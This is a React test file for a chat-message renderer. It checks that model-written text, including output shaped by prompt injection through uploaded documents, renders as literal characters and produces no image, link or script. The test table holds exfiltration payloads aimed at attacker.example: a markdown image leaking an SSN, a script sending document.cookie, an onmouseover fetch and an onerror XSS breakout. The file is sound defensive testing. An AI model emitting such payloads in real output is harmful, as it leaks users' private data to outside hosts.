import { readdirSync, readFileSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { render, screen } from '@testing-library/react';
import { MessageText } from './MessageText';

/**
 * The renderer is the control docs/03 §6d owed, so its spec is written as an
 * attack list rather than as a rendering check: each case is a payload someone
 * could get in front of the assistant through an uploaded document, and the
 * assertion is that NO node capable of making a request came out the other side.
 */

/** Every element type that can cause the browser to fetch something. */
const SINKS = ['a', 'img', 'iframe', 'script', 'link', 'object', 'embed', 'source', 'video'];

function assertNoSinks(container: HTMLElement): void {
  for (const tag of SINKS) {
    expect(container.querySelectorAll(tag)).toHaveLength(0);
  }
}

describe('model-authored text cannot become a request', () => {
  it.each([
    [
      'a markdown image — the exfiltration payload docs/03 names',
      '![](https://attacker.example/?d=ssn)',
    ],
    ['a markdown link', 'See [your will](https://attacker.example/steal)'],
    ['a bare URL, which must NOT be autolinked', 'Visit https://attacker.example/steal now'],
    ['raw HTML', '<img src="https://attacker.example/?d=1"><a href="https://x.example">click</a>'],
    ['a data URI', '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'],
    ['an inline script', '<script>fetch("https://attacker.example/?c="+document.cookie)</script>'],
    ['an event handler', '<div onmouseover="fetch(\'https://attacker.example\')">hover</div>'],
    ['a protocol-relative URL', '![](//attacker.example/pixel.gif)'],
  ])('renders %s as literal text', (_name, payload) => {
    const { container } = render(<MessageText text={payload} />);
    assertNoSinks(container);
    // The payload is visible as CHARACTERS — the user can see what the model
    // said, which is also how a suspicious answer stays legible to them.
    expect(container.textContent).toBe(payload);
  });

  it('renders no markup at all, whatever the input', () => {
    const { container } = render(
      <MessageText text={'# Heading\n- item\n**bold** `code`\n<b>bold</b>'} />,
    );
    // One element (the wrapper) and one text node inside it: nothing was parsed.
    expect(container.querySelectorAll('*')).toHaveLength(1);
    expect(container.firstElementChild?.children).toHaveLength(0);
    assertNoSinks(container);
  });

  it('preserves line breaks without splitting the text apart', () => {
    // Through CSS, so the rendered subtree stays one text node — fewer places
    // where the string is taken apart and reassembled.
    const { container } = render(<MessageText text={'first\n\nsecond'} />);
    expect(container.textContent).toBe('first\n\nsecond');
    expect(container.firstElementChild?.className).toContain('whitespace-pre-wrap');
  });

  it('escapes text that would otherwise close its own element', () => {
    const payload = '</p><img src=x onerror=alert(1)>';
    const { container } = render(<MessageText text={payload} />);
    assertNoSinks(container);
    expect(screen.getByText(payload)).toBeInTheDocument();
  });

  it('renders an empty message without collapsing the element away', () => {
    const { container } = render(<MessageText text="" />);
    expect(container.firstElementChild).not.toBeNull();
  });

  it('accepts a class for the wrapper without letting it reach the text', () => {
    const { container } = render(<MessageText text="hello" className="text-ink-muted" />);
    expect(container.firstElementChild?.className).toContain('text-ink-muted');
    expect(container.textContent).toBe('hello');
  });
});

/** Strip comments so a file that merely DISCUSSES the prop does not trip the fence. */
function stripComments(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
}

function sourceFiles(dir: string): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = join(dir, entry.name);
    if (entry.isDirectory()) {
      out.push(...sourceFiles(full));
    } else if (/\.tsx?$/.test(entry.name)) {
      out.push(full);
    }
  }
  return out;
}

/**
 * The ONE file allowed to inject raw HTML, declared as data (the
 * credential-graph precedent: state the exceptions so a new one fails the
 * build rather than passing review).
 *
 * `app/layout.tsx` inlines a theme script before hydration to avoid a flash of
 * the wrong colour scheme. Its content is a module-level string CONSTANT with
 * no interpolation, no user input and no model output — the opposite of this
 * component's problem. Nothing else in the app may reach for the prop, and
 * least of all anything on a path that renders a message.
 */
const RAW_HTML_ALLOWED = ['app/layout.tsx'];

describe('no escape hatch anywhere in the app', () => {
  it('uses dangerouslySetInnerHTML in exactly the one declared place', () => {
    // A source scan over the whole app, not just this file: the prop is the one
    // line that would undo every assertion above while still passing every
    // rendering test that uses benign input — and it would do so from whatever
    // component someone added it to. Comments are stripped first, so the
    // docstrings explaining the rule do not trip the rule.
    const root = join(__dirname, '..');
    const files = sourceFiles(root).filter((file) => !file.endsWith('MessageText.test.tsx'));
    expect(files.length).toBeGreaterThan(15);
    const users = files
      .filter((file) =>
        stripComments(readFileSync(file, 'utf8')).includes('dangerouslySetInnerHTML'),
      )
      .map((file) => relative(root, file).split(sep).join('/'));
    expect(users.sort()).toEqual(RAW_HTML_ALLOWED);
  });
});
